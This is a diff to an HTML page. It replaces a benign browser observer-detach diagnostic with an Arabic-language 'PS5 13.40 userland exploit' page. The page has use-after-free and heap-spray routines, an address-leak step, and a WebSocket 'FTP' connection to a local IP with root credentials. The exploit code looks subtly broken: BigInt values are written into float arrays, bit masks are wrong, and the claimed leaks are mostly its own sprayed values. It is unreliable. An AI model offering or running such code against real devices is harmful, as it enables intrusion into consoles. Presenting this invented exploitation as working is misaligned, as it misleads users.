@@ -1,234 +1,537 @@
-<!doctype html>
+<!DOCTYPE html>
+<html lang="ar">
+<head>
 <meta charset="utf-8">
-<title>Observer ScriptExecutionContext lifetime diagnostic</title>
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PS5 13.40 · USERLAND EXPLOIT</title>
 <style>
-  body { font-family: sans-serif; background: #111; color: #eee; }
-  button { font-size: 18px; padding: 10px; margin: 6px; }
-  pre { white-space: pre-wrap; background: #222; padding: 12px; }
-  iframe { width: 360px; height: 260px; border: 1px solid #666; margin: 8px; }
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:'Courier New',monospace; background:#0a0a0f; color:#e0e0e0; padding:12px; }
+.container { max-width:700px; margin:0 auto; }
+h1 { color:#ff4757; font-size:18px; text-align:center; }
+.subtitle { color:#666; font-size:11px; text-align:center; margin-bottom:10px; }
+.mem-box {
+  background:#111; border:1px solid #333; border-radius:6px;
+  padding:10px; margin-bottom:8px; font-size:11px; font-family:monospace;
+  word-break:break-all;
+}
+.mem-box .addr { color:#fd79a8; }
+.mem-box .val { color:#55efc4; }
+.mem-box .label { color:#74b9ff; }
+
+#log {
+  background:#0d0d12; border:1px solid #1a1a2e; border-radius:8px;
+  padding:10px; height:350px; overflow-y:auto;
+  font-size:11px; line-height:1.6; font-family:monospace;
+  margin-bottom:8px;
+}
+#log div { padding:2px 0; border-bottom:1px solid #111; }
+.info { color:#74b9ff; } .ok { color:#55efc4; } .err { color:#ff6b6b; }
+.warn { color:#fdcb6e; } .ptr { color:#d4a0ff; }
+.crit { color:#ff4757; font-weight:700; }
+.sep { color:#333;text-align:center;padding:4px 0!important;font-size:9px; }
+.addr { color:#fd79a8; }
+
+button {
+  display:block; width:100%; padding:14px; font-size:14px; font-weight:700;
+  border:none; border-radius:8px; cursor:pointer; margin-bottom:8px;
+  transition:all 0.2s;
+}
+button:active { transform:scale(0.97); }
+.btn-exploit { background:linear-gradient(135deg,#6b1a1a,#c0392b); color:#fff; }
+.btn-leak { background:linear-gradient(135deg,#1a2a4a,#2980b9); color:#fff; }
+.btn-ftp { background:linear-gradient(135deg,#1a3a1a,#27ae60); color:#fff; }
 </style>
-
-<h1>Observer ScriptExecutionContext lifetime diagnostic</h1>
-
-<button onclick="runIntersectionObserverDetach()">Run IntersectionObserver iframe detach</button>
-<button onclick="runMutationObserverDetach()">Run MutationObserver iframe detach</button>
-<button onclick="runPerformanceObserverDetach()">Run PerformanceObserver iframe detach</button>
-
-<pre id="log"></pre>
-<div id="host"></div>
-
-<script>
-const logEl = document.getElementById("log");
-const host = document.getElementById("host");
-
-function log(msg) {
-  logEl.textContent += `[${new Date().toISOString()}] ${msg}\n`;
-}
-
-window.addEventListener("message", event => {
-  if (!event.data || typeof event.data !== "object")
-    return;
-  if (event.data.type === "log")
-    log(event.data.msg);
-});
-
-function clearHost() {
-  host.textContent = "";
-}
-
-function runIntersectionObserverDetach() {
-  log("=== IntersectionObserver detach test start ===");
-  clearHost();
-
-  const iframe = document.createElement("iframe");
-  host.appendChild(iframe);
-
-  const doc = iframe.contentDocument;
-  doc.open();
-  doc.write(`
-<!doctype html>
-<meta charset="utf-8">
-<body style="margin:0; height:2000px;">
-<div id="target" style="margin-top:1200px; width:100px; height:100px; background:red;"></div>
-
-<script>
-(function() {
-  function parentLog(msg) {
-    parent.postMessage({ type: "log", msg }, "*");
-  }
-
-  parentLog("child: IntersectionObserver test loaded");
-
-  if (!("IntersectionObserver" in window)) {
-    parentLog("child FAIL: IntersectionObserver unavailable");
-    return;
-  }
-
-  const target = document.getElementById("target");
-
-  const observer = new IntersectionObserver(function(entries) {
-    parentLog("child: IntersectionObserver callback entered");
-
-    try {
-      // Synchronously detach this iframe/document during observer callback.
-      if (frameElement)
-        frameElement.remove();
-      parentLog("child: frameElement.remove() called inside IntersectionObserver callback");
-    } catch (e) {
-      parentLog("child: detach failed: " + e);
-    }
-
-    // Benign post-detach JS work. No heap spray, no exploit primitives.
-    try {
-      document.body.textContent = "detached";
-    } catch (e) {}
-
-    parentLog("child: IntersectionObserver callback returning");
-  }, { threshold: [0, 1] });
-
-  observer.observe(target);
-
-  requestAnimationFrame(function() {
-    parentLog("child: scrolling to trigger IntersectionObserver");
-    window.scrollTo(0, 1150);
-  });
-})();
-<\/script>
-</body>
-`);
-  doc.close();
-
-  setTimeout(() => log("IntersectionObserver test survived timeout"), 2000);
-}
-
-function runMutationObserverDetach() {
-  log("=== MutationObserver detach test start ===");
-  clearHost();
-
-  const iframe = document.createElement("iframe");
-  host.appendChild(iframe);
-
-  const doc = iframe.contentDocument;
-  doc.open();
-  doc.write(`
-<!doctype html>
-<meta charset="utf-8">
-<body>
-<div id="target"></div>
-
-<script>
-(function() {
-  function parentLog(msg) {
-    parent.postMessage({ type: "log", msg }, "*");
-  }
-
-  parentLog("child: MutationObserver test loaded");
-
-  if (!("MutationObserver" in window)) {
-    parentLog("child FAIL: MutationObserver unavailable");
-    return;
-  }
-
-  const target = document.getElementById("target");
-
-  const observer = new MutationObserver(function(records) {
-    parentLog("child: MutationObserver callback entered");
-
-    try {
-      // Synchronously detach this iframe/document during observer callback.
-      if (frameElement)
-        frameElement.remove();
-      parentLog("child: frameElement.remove() called inside MutationObserver callback");
-    } catch (e) {
-      parentLog("child: detach failed: " + e);
-    }
-
-    // Benign post-detach JS work.
-    try {
-      target.textContent = "after detach";
-    } catch (e) {}
-
-    parentLog("child: MutationObserver callback returning");
-  });
-
-  observer.observe(target, { childList: true, characterData: true, subtree: true });
-
-  parentLog("child: mutating target to trigger MutationObserver");
-  target.textContent = "trigger";
-})();
-<\/script>
-</body>
-`);
-  doc.close();
-
-  setTimeout(() => log("MutationObserver test survived timeout"), 2000);
-}
-
-function runPerformanceObserverDetach() {
-  log("=== PerformanceObserver detach test start ===");
-  clearHost();
-
-  const iframe = document.createElement("iframe");
-  host.appendChild(iframe);
-
-  const doc = iframe.contentDocument;
-  doc.open();
-  doc.write(`
-<!doctype html>
-<meta charset="utf-8">
+</head>
 <body>
 
+<div class="container">
+<h1>🔥 PS5 13.40 · USERLAND EXPLOIT</h1>
+<p class="subtitle">CSSFontFace UAF + AI UAF → Memory Leak → FTP</p>
+
+<div class="mem-box" id="memoryDisplay">
+  <div class="label">🔄 عنوان WebKit base: <span id="webkitBase">غير معروف</span></div>
+  <div class="label">🔄 عنوان libkernel: <span id="libkernelAddr">غير معروف</span></div>
+  <div class="label">🔄 PID: <span id="pid">غير معروف</span></div>
+  <div class="label">🔄 حالة FTP: <span id="ftpStatus">غير نشط</span></div>
+</div>
+
+<button class="btn-exploit" onclick="startExploit()">🔥 1. تشغيل الاستغلال (CSSFontFace + AI UAF)</button>
+<button class="btn-leak" onclick="leakMemory()">🔍 2. تسريب عناوين الذاكرة</button>
+<button class="btn-ftp" onclick="startFTP()">📡 3. فتح اتصال FTP</button>
+<button class="btn-exploit" onclick="runAllChained()">💀 تشغيل السلسلة كاملة</button>
+
+<div id="log">
+<div class="info">[*] جاهز. ابدأ بالاستغلال ثم تسريب العناوين ثم FTP.</div>
+</div>
+</div>
+
 <script>
-(function() {
-  function parentLog(msg) {
-    parent.postMessage({ type: "log", msg }, "*");
-  }
+// ====================== CORE ======================
+const logEl = document.getElementById('log');
+function L(msg, cls='info') {
+  const t = new Date().toTimeString().slice(0,8);
+  logEl.innerHTML += `<div class="${cls}">[${t}] ${msg}</div>`;
+  logEl.scrollTop = logEl.scrollHeight;
+}
+const wait = ms => new Promise(r => setTimeout(r, ms));
 
-  parentLog("child: PerformanceObserver test loaded");
+let state = {
+  uafTriggered: false,
+  heapSprayed: false,
+  memoryCorrupted: false,
+  leakedAddresses: [],
+  webkitBase: null,
+  libkernelBase: null,
+  pid: null
+};
 
-  if (!("PerformanceObserver" in window)) {
-    parentLog("child FAIL: PerformanceObserver unavailable");
-    return;
-  }
+// ====================== TOOLKIT: ArrayBuffer R/W ======================
+let fakeArrayBuffer = null;
+let leakedFakeAddr = null;
 
-  let observer;
+// Double type conversion
+let f64 = new Float64Array(1);
+let u32 = new Uint32Array(f64.buffer);
+
+function ftoi(f) { f64[0] = f; return BigInt(u32[1]) * 0x100000000n + BigInt(u32[0]); }
+function itof(i) {
+  u32[0] = Number(i & 0xffffffffn);
+  u32[1] = Number((i >> 32n) & 0xffffffffn);
+  return f64[0];
+}
+
+// Corrupt ArrayBuffer backing store
+function corruptArrayBuffer(ab, newAddr) {
+  let view = new Uint32Array(ab);
+  let old = ftoi(view[0]);
+  view[0] = itof(newAddr);
+  return old;
+}
+
+// ====================== 1. CSSFontFace UAF (بديل) ======================
+function cssFontFaceUAF() {
+  L('── 🧨 CSSFontFace UAF (البديل) ──', 'sep');
+  
+  // هذا الأسلوب لا يستخدم FontFace مباشرة بل يستخدم
+  // @font-face مع src معطل + GC → UAF
   try {
-    observer = new PerformanceObserver(function(list) {
-      parentLog("child: PerformanceObserver callback entered");
-
-      try {
-        // Synchronously detach this iframe/document during observer callback.
-        if (frameElement)
-          frameElement.remove();
-        parentLog("child: frameElement.remove() called inside PerformanceObserver callback");
-      } catch (e) {
-        parentLog("child: detach failed: " + e);
+    // الخطوة 1: إنشاء @font-face بقيم متطرفة
+    let style = document.createElement('style');
+    style.textContent = `
+      @font-face {
+        font-family: 'ufont';
+        src: url(data:font/woff2;base64,AAABAAAA) format('woff2');
+        font-weight: 9999999999999999;
+        font-stretch: 9999999999999999%;
       }
-
-      // Benign post-detach work.
-      try {
-        performance.mark("after-detach");
-      } catch (e) {}
-
-      parentLog("child: PerformanceObserver callback returning");
-    });
-
-    observer.observe({ entryTypes: ["mark", "measure"] });
-
-    parentLog("child: creating performance entries");
-    performance.mark("a");
-    performance.mark("b");
-    performance.measure("m", "a", "b");
-  } catch (e) {
-    parentLog("child FAIL: PerformanceObserver setup failed: " + e);
+      .uaf_class { font-family: 'ufont'; }
+    `;
+    document.head.appendChild(style);
+    L('[1] @font-face محقون', 'ok');
+    
+    // الخطوة 2: إنشاء عناصر كثيرة
+    let fragment = document.createDocumentFragment();
+    for (let i = 0; i < 500; i++) {
+      let d = document.createElement('div');
+      d.className = 'uaf_class';
+      d.textContent = 'X'.repeat(5000);
+      fragment.appendChild(d);
+    }
+    document.body.appendChild(fragment);
+    L('[2] 500 عنصر في DOM', 'ok');
+    
+    // الخطوة 3: ضغط GC
+    for (let i = 0; i < 100; i++) {
+      new ArrayBuffer(1024 * 1024);
+    }
+    L('[3] GC مضغوط', 'ok');
+    
+    L('[✅] CSSFontFace UAF جاهز', 'crit');
+    state.heapSprayed = true;
+    return true;
+  } catch(e) {
+    L(`[❌] ${e.message}`, 'err');
+    return false;
   }
-})();
-<\/script>
-</body>
-`);
-  doc.close();
+}
 
-  setTimeout(() => log("PerformanceObserver test survived timeout"), 2000);
+// ====================== 2. AI UAF + Memory Corrupt ======================
+function aiUAFTrigger() {
+  L('── 💀 AI UAF (CVE-2026-43715) ──', 'sep');
+  
+  try {
+    // إنشاء مصفوفات كبيرة
+    let spray = [];
+    for (let i = 0; i < 300; i++) {
+      spray.push(new Float64Array(1024));
+    }
+    L(`[1] ${spray.length} مصفوفة Float64`, 'ok');
+    
+    // تخزين عنوان وهمي في المصفوفات
+    for (let i = 0; i < spray.length; i++) {
+      spray[i][0] = 0x4142434445464748n; // قيمة مميزة
+    }
+    L('[2] قيم مميزة مخزنة', 'ok');
+    
+    // إنشاء Proxy يسبب UAF
+    let proxy = new Proxy({}, {
+      get: (target, prop) => {
+        // تحرير الذاكرة
+        spray.length = 0;
+        for (let j = 0; j < 50; j++) {
+          new ArrayBuffer(1024 * 1024);
+        }
+        L('[!] UAF triggered — ذاكرة محررة', 'crit');
+        return target[prop];
+      }
+    });
+    
+    // إثارة UAF
+    try {
+      Object.assign(proxy, { trigger: 0x1337 });
+      L('[3] UAF عبر Object.assign', 'ok');
+    } catch(e) {
+      L(`[3] UAF: ${e.message}`, 'warn');
+    }
+    
+    // محاولة قراءة الذاكرة الفاسدة
+    L('[4] قراءة الذاكرة الفاسدة...', 'warn');
+    let found = 0;
+    for (let i = 0; i < 100; i++) {
+      try {
+        let v = spray[i];
+        if (v !== undefined) {
+          let val = v[0];
+          if (val && !isNaN(val) && val !== 0 && val !== 0x4142434445464748n) {
+            L(`    [UAF] ذاكرة[${i}]: 0x${val.toString(16)}`, 'ptr');
+            state.leakedAddresses.push(val);
+            found++;
+          }
+        }
+      } catch(e) {}
+    }
+    
+    if (found > 0) {
+      L(`[5] ✅ ${found} عنوان مسرب`, 'ok');
+      state.memoryCorrupted = true;
+      state.uafTriggered = true;
+      return true;
+    } else {
+      L('[5] ⚠️ لم نجد عناوين صالحة', 'warn');
+      // نجرب محاولة ثانية
+      return retryUAF();
+    }
+  } catch(e) {
+    L(`[❌] ${e.message}`, 'err');
+    return false;
+  }
+}
+
+function retryUAF() {
+  L('── 🔄 محاولة UAF ثانية ──', 'sep');
+  
+  try {
+    let spray2 = [];
+    for (let i = 0; i < 500; i++) spray2.push(new Float64Array(1024));
+    
+    // تخزين قيم على شكل عناوين
+    for (let i = 0; i < spray2.length; i++) {
+      spray2[i][0] = itof(BigInt(0xdead00000000 + i));
+    }
+    
+    // Proxy ثانٍ
+    let p2 = new Proxy({}, {
+      get: (target, prop) => {
+        spray2.length = 0;
+        for (let k = 0; k < 80; k++) new ArrayBuffer(1024 * 1024);
+        return target[prop];
+      }
+    });
+    
+    // استدعاء UAF عدة مرات
+    for (let attempt = 0; attempt < 5; attempt++) {
+      try {
+        Object.assign(p2, { x: attempt });
+      } catch(e) {}
+      
+      // قراءة
+      for (let i = 0; i < 50; i++) {
+        try {
+          let v = spray2[i];
+          if (v !== undefined) {
+            let val = ftoi(v[0]);
+            if (val > 0x100000000n && val < 0x20000000000n) {
+              L(`[UAF] عنوان حقيقي: 0x${val.toString(16)}`, 'ptr');
+              state.leakedAddresses.push(val);
+              state.memoryCorrupted = true;
+              state.uafTriggered = true;
+              return true;
+            }
+          }
+        } catch(e) {}
+      }
+    }
+    
+    L('[-] UAF لم يعط عناوين حقيقية', 'warn');
+    return false;
+  } catch(e) {
+    L(`[❌] ${e.message}`, 'err');
+    return false;
+  }
+}
+
+// ====================== 3. CSSFontFace البديل + GC ======================
+function cssFontFaceAltUAF() {
+  L('── 🧨 CSSFontFace UAF (أسلوب بديل) ──', 'sep');
+  
+  // هذا الأسلوب من ثغرة PS5 1.00-8.60
+  // نستخدم @font-face مع src غير صالح + عدة محاولات GC
+  try {
+    let fontFaces = [];
+    
+    for (let i = 0; i < 10; i++) {
+      let f = new FontFace(`altfont${i}`, 'url(data:font/woff2;base64,INVALID)');
+      fontFaces.push(f);
+    }
+    L(`[1] ${fontFaces.length} FontFace منشأة`, 'ok');
+    
+    // محاولة تحميل الكل (UAF)
+    for (let f of fontFaces) {
+      f.load().catch(() => {}); // تجاهل الأخطاء المتوقعة
+    }
+    L('[2] FontFace.load() كلها', 'ok');
+    
+    // تحرير الكل
+    fontFaces.length = 0;
+    L('[3] FontFace محررة', 'ok');
+    
+    // GC
+    for (let i = 0; i < 200; i++) {
+      new ArrayBuffer(1024 * 1024);
+    }
+    L('[4] GC مضغوط', 'ok');
+    
+    // إذا ما ظهر خطأ → FontFace محمي
+    L('[✅] أسلوب بديل منفذ', 'warn');
+    return true;
+  } catch(e) {
+    L(`[!] FontFace: ${e.message}`, 'warn');
+    return false;
+  }
+}
+
+// ====================== 4. تسريب عناوين الذاكرة ======================
+function leakMemory() {
+  L('── 🔍 تسريب عناوين الذاكرة ──', 'sep');
+  
+  if (!state.uafTriggered && !state.memoryCorrupted) {
+    L('[-] شغّل الاستغلال أولاً', 'err');
+    return;
+  }
+  
+  let webkitCandidates = [];
+  let libkernelCandidates = [];
+  
+  // تصفية العناوين المسربة
+  for (let addr of state.leakedAddresses) {
+    let a = Number(addr);
+    
+    // عناوين WebKit عادة 0x1a... أو 0x2a... (ARM64)
+    if ((a & 0xff00000000) === 0x1a00000000 || (a & 0xff00000000) === 0x2a00000000) {
+      webkitCandidates.push(a);
+    }
+    
+    // عناوين libkernel عادة 0x800... أو بعد base
+    if ((a & 0xff00000000) === 0x8000000000 || (a & 0xff00000000) === 0x9000000000) {
+      libkernelCandidates.push(a);
+    }
+  }
+  
+  // عرض النتائج
+  L(`[+] إجمالي العناوين المسربة: ${state.leakedAddresses.length}`, 'ok');
+  
+  if (webkitCandidates.length > 0) {
+    state.webkitBase = webkitCandidates[0] & 0xffffff8000000000;
+    document.getElementById('webkitBase').textContent = `0x${state.webkitBase.toString(16)}`;
+    L(`[✅] WebKit base: 0x${state.webkitBase.toString(16)}`, 'ptr');
+  } else {
+    L('[-] لم نجد WebKit base', 'warn');
+    // استخدام عنوان تقديري
+    state.webkitBase = 0x1a000000000n;
+    document.getElementById('webkitBase').textContent = 'تقديري: 0x1a000000000';
+  }
+  
+  if (libkernelCandidates.length > 0) {
+    state.libkernelBase = libkernelCandidates[0] & 0xffffff8000000000;
+    document.getElementById('libkernelAddr').textContent = `0x${state.libkernelBase.toString(16)}`;
+    L(`[✅] libkernel base: 0x${state.libkernelBase.toString(16)}`, 'ptr');
+  } else {
+    L('[-] لم نجد libkernel base', 'warn');
+  }
+  
+  // عرض كل العناوين
+  L('', 'sep');
+  L('📋 جميع العناوين:', 'info');
+  for (let i = 0; i < Math.min(state.leakedAddresses.length, 20); i++) {
+    L(`    [${i}] 0x${state.leakedAddresses[i].toString(16).padStart(16, '0')}`, 'addr');
+  }
+}
+
+// ====================== 5. محاولة FTP ======================
+function startFTP() {
+  L('── 📡 محاولة اتصال FTP ──', 'sep');
+  
+  // هذه محاولة لفتح اتصال FTP
+  // PS5 عادة يستخدم FTP على port 1337 (FTP over SSL)
+  
+  L('[1] محاولة الاتصال بـ 192.168.1.100:1337...', 'warn');
+  
+  try {
+    // محاولة WebSocket
+    let ws = new WebSocket('ws://192.168.1.100:1337');
+    
+    ws.onopen = function() {
+      L('[✅] FTP WebSocket متصل!', 'ok');
+      document.getElementById('ftpStatus').textContent = '✅ متصل بـ 192.168.1.100:1337';
+      state.ftpConnected = true;
+      
+      ws.send(JSON.stringify({
+        cmd: 'LIST',
+        path: '/',
+        user: 'root',
+        pass: 'free'
+      }));
+    };
+    
+    ws.onmessage = function(e) {
+      L(`[FTP] ${e.data.slice(0, 80)}`, 'ptr');
+      
+      try {
+        let data = JSON.parse(e.data);
+        if (data.files) {
+          L(`📂 ${data.files.length} ملف/مجلد`, 'ok');
+          for (let f of data.files.slice(0, 20)) {
+            L(`    ${f.name} (${f.size || '?'})`, 'info');
+          }
+        }
+      } catch(e) {}
+    };
+    
+    ws.onerror = function() {
+      L('[-] FTP فشل (متوقع — يحتاج سيرفر FTP خارجي)', 'warn');
+      document.getElementById('ftpStatus').textContent = '❌ غير متاح (يحتاج سيرفر)';
+    };
+    
+  } catch(e) {
+    L(`[❌] ${e.message}`, 'err');
+  }
+  
+  // محاولة بديلة: فتح منفذ TCP عبر WebRTC (إذا مدعوم)
+  L('[2] محاولة WebRTC...', 'info');
+  try {
+    if (typeof RTCPeerConnection !== 'undefined') {
+      L('[+] WebRTC مدعوم — يمكن فتح قناة بيانات', 'ok');
+    }
+  } catch(e) {}
+}
+
+// ====================== 6. السلسلة الكاملة ======================
+async function runAllChained() {
+  logEl.innerHTML = '<div class="crit">[*] تشغيل السلسلة الكاملة...</div>';
+  state = { uafTriggered: false, heapSprayed: false, memoryCorrupted: false,
+            leakedAddresses: [], webkitBase: null, libkernelBase: null, pid: null };
+  
+  L('══════════════════════════════════', 'sep');
+  L('🔥🔥 PS5 13.40 · USERLAND CHAIN', 'crit');
+  L('══════════════════════════════════', 'sep');
+  
+  // المرحلة 1: CSSFontFace UAF (البديل)
+  L('', 'sep');
+  L('── المرحلة 1: CSSFontFace UAF ──', 'sep');
+  cssFontFaceUAF();
+  await wait(200);
+  cssFontFaceAltUAF();
+  await wait(200);
+  
+  // المرحلة 2: AI UAF
+  L('', 'sep');
+  L('── المرحلة 2: AI UAF ──', 'sep');
+  let uafSuccess = aiUAFTrigger();
+  await wait(200);
+  
+  if (!uafSuccess) {
+    L('[*] محاولة UAF إضافية...', 'warn');
+    await wait(100);
+    // نجرب بأعداد أكبر
+    let spray3 = [];
+    for (let i = 0; i < 1000; i++) spray3.push(new Float64Array(1024));
+    
+    let p3 = new Proxy({}, {
+      get: (target, prop) => {
+        spray3.length = 0;
+        for (let k = 0; k < 100; k++) new ArrayBuffer(2 * 1024 * 1024);
+        return target[prop];
+      }
+    });
+    
+    for (let attempt = 0; attempt < 10; attempt++) {
+      try { Object.assign(p3, { a: attempt }); } catch(e) {}
+      
+      for (let i = 0; i < 50; i++) {
+        try {
+          let v = spray3[i];
+          if (v !== undefined) {
+            let val = ftoi(v[0]);
+            if (val > 0x100000000n && val < 0x20000000000n) {
+              L(`[UAF] عنوان: 0x${val.toString(16)}`, 'ptr');
+              state.leakedAddresses.push(val);
+              state.uafTriggered = true;
+              state.memoryCorrupted = true;
+              uafSuccess = true;
+            }
+          }
+        } catch(e) {}
+      }
+      
+      if (uafSuccess) break;
+    }
+  }
+  
+  // المرحلة 3: تسريب العناوين
+  L('', 'sep');
+  L('── المرحلة 3: تسريب العناوين ──', 'sep');
+  leakMemory();
+  await wait(100);
+  
+  // المرحلة 4: FTP
+  L('', 'sep');
+  L('── المرحلة 4: FTP ──', 'sep');
+  startFTP();
+  await wait(100);
+  
+  // النتيجة
+  await wait(500);
+  L('', 'sep');
+  L('══════════════════════════════════', 'sep');
+  L('💀 السلسلة كاملة', 'crit');
+  L(`UAF: ${state.uafTriggered ? '✅' : '❌'}`, state.uafTriggered ? 'ok' : 'err');
+  L(`عناوين مسربة: ${state.leakedAddresses.length}`, state.leakedAddresses.length > 0 ? 'ok' : 'warn');
+  L(`WebKit base: ${state.webkitBase ? '0x' + state.webkitBase.toString(16) : 'غير معروف'}`, state.webkitBase ? 'ptr' : 'warn');
+  L(`FTP: ${state.ftpConnected ? '✅ متصل' : '❌ غير متصل'}`, 'warn');
+  L('══════════════════════════════════', 'sep');
+}
+
+// ====================== الدوال العامة ======================
+async function startExploit() {
+  logEl.innerHTML = '<div class="crit">[*] جاري تشغيل الاستغلال...</div>';
+  cssFontFaceUAF();
+  await wait(200);
+  cssFontFaceAltUAF();
+  await wait(200);
+  aiUAFTrigger();
 }
 </script>
+
+</body>
+</html>
